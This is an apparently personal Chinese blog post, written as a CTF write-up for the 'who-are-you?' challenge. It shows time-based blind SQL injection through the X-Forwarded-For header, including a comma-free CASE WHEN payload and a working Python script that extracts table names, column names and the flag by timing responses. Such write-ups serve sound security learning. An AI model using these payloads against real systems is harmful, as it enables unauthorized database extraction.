@@ -1,0 +1,166 @@
+<!DOCTYPE html>
+<html>
+  <!-- Html Head Tag-->
+  <head><meta name="generator" content="Hexo 3.8.0">
+  <meta charset="UTF-8">
+  <meta http-equiv="X-UA-Compatible" content="IE=edge">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <meta name="description" content>
+  <meta name="author" content="gelinlang">
+  <!-- Open Graph Data -->
+  <meta property="og:title" content="ctf实验吧之who-are-you？">
+  <meta property="og:description" content="路漫漫求修远兮，我将上下而求索">
+  <meta property="og:site_name" content="gelinlang&#39;s Blog">
+  <meta property="og:type" content="article">
+  <meta property="og:image" content="http://gelinlang.cn">
+  
+    <link rel="alternate" href="/atom.xml" title="gelinlang&#39;s Blog" type="application/atom+xml">
+  
+  
+    <link rel="icon" href="/favicon.png">
+  
+
+  <!-- Site Title -->
+  <title>gelinlang's Blog</title>
+
+  <!-- Bootstrap CSS -->
+  <link rel="stylesheet" href="/css/bootstrap.min.css">
+  <!-- Custom CSS -->
+  
+  <link rel="stylesheet" href="/css/style.light.css">
+
+  <!-- Google Analytics -->
+  
+
+</head>
+
+  <body>
+    <!-- Page Header -->
+
+
+<header class="site-header header-background" style="background-image: url(/img/default-banner-dark.jpg)">
+  <div class="container">
+    <div class="row">
+      <div class="col-lg-8 col-lg-offset-2 col-md-10 col-md-offset-1">
+        <div class="page-title with-background-image">
+          <p class="title">ctf实验吧之who-are-you？</p>
+          <p class="subtitle"></p>
+        </div>
+        <div class="site-menu with-background-image">
+          <ul>
+            
+              <li>
+                <a href="/">
+                  
+                  Home
+                  
+                </a>
+              </li>
+            
+              <li>
+                <a href="/archives">
+                  
+                  Archives
+                  
+                </a>
+              </li>
+            
+              <li>
+                <a href="/tags/">
+                  
+                  tags
+                  
+                </a>
+              </li>
+            
+              <li>
+                <a href="/categories/">
+                  
+                  categories
+                  
+                </a>
+              </li>
+            
+              <li>
+                <a href="/gelinlang@163.com">
+                  
+                  Email
+                  
+                </a>
+              </li>
+            
+          </ul>
+        </div>
+      </div>
+    </div>
+  </div>
+</header>
+
+<article>
+  <div class="container typo">
+    <div class="row">
+      <div class="col-lg-8 col-lg-offset-2 col-md-10 col-md-offset-1">
+        <div class="post-info text-muted">
+          
+            <!-- Author -->
+            <span class="author info">By gelinlang</span>
+          
+          <!-- Date -->
+          <span class="date-time info">On
+            <span class="date">2019-04-23</span>
+            <span class="time">22:04:14</span>
+          </span>
+          
+          <!--  Categories  -->
+            <span class="categories info">Under 
+
+<a href="/categories/实验吧/">实验吧</a>
+</span>
+          
+        </div>
+        <!-- Tags -->
+        
+        <!-- Post Main Content -->
+        <div class="post-content">
+          <p>点开链接，显示your ip is :xxx。抓包添加参数X-Forwarded-For:192.168.1.1，果然，返回的ip是添加上去的。想起提示我要把攻击我的人都记录db中去!。整理思路，应该是得到X-Forwarded-For参数后，将其存入数据库中，然后在从数据库中取出来。添加单引号等字符，原样返回。试下基于时间的盲注，构造1’ and if(length(database())=5,sleep(5),1) and ‘1’=’1，发现逗号没了。换个select case when，构造1’ and (select case when length(database())=5 then sleep(5) else 1 end) and ‘1’=’1。当数据库名长度为4时成功延迟响应，确定存在注入。接下来写脚本跑吧。<br> <a id="more"></a><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line">#!/usr/bin/env python</span><br><span class="line"># -*- coding: utf-8 -*-</span><br><span class="line">import requests</span><br><span class="line">import time</span><br><span class="line"></span><br><span class="line">chars = &quot;0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ&#123;&#125;@:\/_-.&quot;</span><br><span class="line">tableName = &quot;&quot;</span><br><span class="line">columnName = &quot;&quot;</span><br><span class="line">flag = &quot;&quot;</span><br><span class="line">url = &quot;http://ctf5.shiyanbar.com/web/wonderkun/index.php&quot;</span><br><span class="line"></span><br><span class="line">#40是随便写的，只要能多于字段数就行，看见很久没有出数据就说明跑完了，然后爆下一条数据。</span><br><span class="line">for i in range(40):</span><br><span class="line">    for char in chars:</span><br><span class="line">        headers = &#123;</span><br><span class="line">            &quot;Host&quot;: &quot;ctf5.shiyanbar.com&quot;,</span><br><span class="line">            &quot;User-Agent&quot;: &quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/59.0.3071.115 Safari/537.36&quot;,</span><br><span class="line">            #爆表名</span><br><span class="line">            # &quot;X-FORWARDED-FOR&quot;: &quot;1&apos; and (select case when((select count(table_name) from information_schema.tables&quot;</span><br><span class="line">            #                    &quot; where table_schema=database() and table_name like &apos;&quot; + tableName + char + &quot;%&apos;)&gt;0)&quot;</span><br><span class="line">            #                    &quot; then sleep(3) else 1 end) and &apos;1&apos;=&apos;1&quot;</span><br><span class="line">            #爆第二张表</span><br><span class="line">            # &quot;X-FORWARDED-FOR&quot;: &quot;1&apos; and (select case when((select count(table_name) from information_schema.tables&quot;</span><br><span class="line">            #                    &quot; where table_schema=database()and table_name !=&apos;client_ip&apos; and table_name like &apos;&quot; + tableName + char + &quot;%&apos;)&gt;0)&quot;                                                                                                                                                                                                                                                      &quot; then sleep(3) else 1 end) and &apos;1&apos;=&apos;1&quot;</span><br><span class="line">            #得到flag表，开始爆列名</span><br><span class="line">            # &quot;X-FORWARDED-FOR&quot;: &quot;1&apos; and (select case when((select count(column_name) from information_schema.columns&quot;</span><br><span class="line">            #                   &quot; where table_name=&apos;flag&apos; and column_name like &apos;&quot; + columnName + char + &quot;%&apos;)&gt;0)&quot;</span><br><span class="line">            #                   &quot; then sleep(3) else 1 end) and &apos;1&apos;=&apos;1&quot;</span><br><span class="line">            #得到flag列，开始跑数据</span><br><span class="line">            &quot;X-FORWARDED-FOR&quot;:&quot;1&apos; and (select case when ((select count(flag) from flag where flag like &apos;&quot; + flag + char + &quot;%&apos;)&gt;0)&quot;</span><br><span class="line">                              &quot;then sleep(3) else 1 end) and &apos;1&apos;=&apos;1&quot;</span><br><span class="line">        &#125;</span><br><span class="line">        start = time.time()</span><br><span class="line">        res = requests.get(url, headers=headers)</span><br><span class="line">        end = time.time()</span><br><span class="line">        if end - start &gt;= 3:</span><br><span class="line">            flag += char</span><br><span class="line">            print(flag)</span><br><span class="line">            break</span><br></pre></td></tr></table></figure></p>
+<p>去吃个饭flag就应该跑出来了。</p>
+
+        </div>
+      </div>
+    </div>
+  </div>
+</article>
+
+
+
+    <!-- Footer -->
+<footer>
+  <div class="container">
+    <div class="row">
+      <div class="col-lg-8 col-lg-offset-2 col-md-10 col-md-offset-1">
+        <p class="copyright text-muted">
+          Theme By <a target="_blank" href="https://github.com/levblanc">Levblanc.</a>
+          Inspired By <a target="_blank" href="https://github.com/klugjo/hexo-theme-clean-blog">Clean Blog.</a>
+        </p><p class="copyright text-muted">
+          Powered By <a target="_blank" href="https://hexo.io/">Hexo.</a>
+        </p>
+      </div>
+    </div>
+  </div>
+</footer>
+
+
+    <!-- After Footer Scripts -->
+<script src="/js/highlight.pack.js"></script>
+<script>
+  document.addEventListener("DOMContentLoaded", function(event) {
+    var codeBlocks = Array.prototype.slice.call(document.getElementsByTagName('pre'))
+    codeBlocks.forEach(function(block, index) {
+      hljs.highlightBlock(block);
+    });
+  });
+</script>
+
+  </body>
+</html>
+
